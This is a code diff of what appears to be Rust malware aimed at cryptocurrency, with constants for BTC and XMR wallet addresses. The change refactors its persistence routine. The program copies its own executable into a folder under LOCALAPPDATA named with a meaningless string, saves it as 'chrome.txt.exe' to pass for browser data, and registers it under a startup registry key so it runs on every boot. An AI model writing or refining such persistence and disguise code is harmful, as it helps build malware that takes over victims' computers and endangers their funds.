@@ -18,7 +18,6 @@ use winreg::{enums::*, RegKey};
 static MUTEX: &str = "adsdfs98f76sda98fysdf";
 static FILE_NAME: &str = "chrome.txt";
 static FOLDER_NAME: &str = "fsdljfsd";
-static STARTUP_NAME: &str = "fdkjfd";
 
 const BTC_ADDR: &str = "h";
 const XMR_ADDR: &str = "dfssdf";
@@ -43,18 +42,26 @@ fn add_to_startup_registry(path: String) -> io::Result<()> {
     key.set_value(MUTEX, &path)
 }
 
+fn get_destination_path() -> (PathBuf, PathBuf) {
+    let desired_path = PathBuf::from(
+        env::var("LOCALAPPDATA").unwrap()
+    ).join(FOLDER_NAME);
+    
+    (
+        desired_path.join(format!("{}.exe", FILE_NAME)), 
+        desired_path
+    )
+}
+
 fn persistence() -> io::Result<()> {
     let current_path = env::current_exe()?;
 
-    let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(MUTEX);
+    let (file_path, folder_path) = get_destination_path();
 
-    let file_name = current_path.file_name().unwrap();
-    let destination_path = desired_path.join(file_name);
-
-    match add_to_startup_registry(destination_path.to_str().unwrap().to_string()) {
+    match add_to_startup_registry(file_path.to_str().unwrap().to_string()) {
         Ok(..) => {
-            create_dir_all(&desired_path)?;
-            copy(current_path, destination_path)?;
+            create_dir_all(&folder_path)?;
+            copy(current_path, file_path)?;
         }
         Err(..) => {}
     };
